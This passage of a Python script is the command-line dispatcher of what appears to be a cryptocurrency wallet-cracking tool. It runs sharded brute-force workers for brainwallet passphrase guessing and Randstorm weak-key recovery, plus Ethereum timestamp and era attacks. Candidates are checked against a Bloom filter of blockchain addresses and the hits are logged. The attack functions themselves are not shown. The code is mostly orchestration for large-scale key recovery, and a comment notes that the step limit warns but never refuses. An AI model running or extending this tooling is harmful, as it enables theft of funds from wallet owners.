        specs, errs = [], []
        for tok in args.cli_eth_era.split(","):
            tok = tok.strip()
            if not tok:
                continue
            eid, _, rest = tok.partition(":")
            steps, offset = args.steps, 0
            if rest:
                steps_s, _, off_s = rest.partition("@")
                try:
                    if steps_s:
                        steps = int(steps_s.replace(",", ""))
                    if off_s:
                        offset = int(off_s.replace(",", ""))
                except ValueError:
                    errs.append("%s: steps/offset must be integers" % tok)
                    continue
            specs.append({"id": eid.strip(), "steps": steps, "offset": offset})
        if errs:
            sys.exit("\n".join(errs))
        known = [e["id"] for e in ETH_ERAS]
        bad = [s["id"] for s in specs if s["id"] not in known]
        if bad:
            sys.exit("unknown era(s): %s — available: %s (--list-eras)"
                     % (", ".join(bad), ", ".join(known)))
        if not specs:
            sys.exit("--cli-eth-era needs at least one era id")
        total = sum(s["steps"] for s in specs)
        if total > ETH_MAX_TOTAL_STEPS:
            # A warning, not a refusal: it still runs, batch after batch.
            print("[era] note: %s" % _batch_note(total, ETH_MAX_STEPS, "steps",
                                                 ETH_RATE / max(1, len(ids))))
        elif total > ETH_MAX_STEPS:
            print("[era] note: %s" % _batch_note(total, ETH_MAX_STEPS, "steps"))
        attack_eth_eras(specs, ids, print, job)
        sys.exit(0)

    if args.cli_eth:
        job = {"stop": False, "progress": 0, "detail": ""}
        ids = [r.strip() for r in args.recipes.split(",") if r.strip()]
        bad = [r for r in ids if r not in ETH_RECIPES]
        if bad:
            sys.exit("unknown recipe(s): %s — available: %s"
                     % (", ".join(bad), ", ".join(ETH_RECIPES)))
        attack_eth_timestamp(args.cli_eth[0], args.cli_eth[1], args.unit,
                             ids, print, job)
        sys.exit(0)

    if args.worker:
        if not args.shard or "/" not in args.shard:
            sys.exit("--worker requires --shard IDX/N (e.g. --shard 3/10)")
        try:
            idx, n = (int(x) for x in args.shard.split("/", 1))
        except ValueError:
            sys.exit("--shard must look like IDX/N (e.g. 3/10)")
        if not (0 <= idx < n) or n < 1:
            sys.exit(f"shard index {idx} out of range for {n} shards")
        if not BLOOM_PATH.exists():
            sys.exit("bloom not found — run --build-bloom first "
                     "(or point DISK_PATH at the node's data dir)")
        bf = BloomFilter.load(BLOOM_PATH)
        hits_path = DATA_DIR / f"hits_shard{idx}_of_{n}.jsonl"
        _HITS_FILE = open(hits_path, "a", encoding="utf-8")
        job = {"stop": False, "progress": 0, "detail": ""}
        if args.worker == "randstorm":
            s, e = _shard_range(GENESIS_TS, CUTOFF_TS, idx, n)
            print(f"[worker] randstorm shard {idx+1}/{n}: {s}..{e}", flush=True)
            attack_randstorm(s, e, bf, print, job)
        else:
            if not args.wordlist:
                sys.exit("--worker brainwallet requires --wordlist FILE")
            with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
                pws = [l.rstrip("\n") for l in f if l.strip()]
            shard = pws[idx::n]
            print(f"[worker] brainwallet shard {idx+1}/{n}: "
                  f"{len(shard):,}/{len(pws):,} passphrases", flush=True)
            attack_brainwallet(shard, bf, print, job)
        _HITS_FILE.close()
        print(f"[worker] done — hits appended to {hits_path}", flush=True)
        sys.exit(0)

    app.run(host="0.0.0.0", port=args.port, debug=False)
